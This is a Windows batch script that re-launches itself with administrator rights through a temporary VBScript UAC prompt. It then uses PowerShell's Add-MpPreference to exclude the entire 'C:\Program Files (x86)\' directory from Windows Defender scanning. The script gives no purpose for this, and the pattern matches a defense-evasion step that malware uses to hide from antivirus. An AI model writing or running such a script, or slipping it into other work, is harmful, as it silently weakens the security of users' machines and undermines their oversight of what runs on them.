@echo off
:: Check for administrative permissions
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    echo Requesting administrative privileges...
    goto UACPrompt
) else (
    goto gotAdmin
)

:UACPrompt
    echo Set UAC = CreateObject("Shell.Application") > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""%~f0""", "", "runas", 1 >> "%temp%\getadmin.vbs"
    cscript //nologo "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

:: Add exclusion path to Windows Defender using PowerShell
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\'"

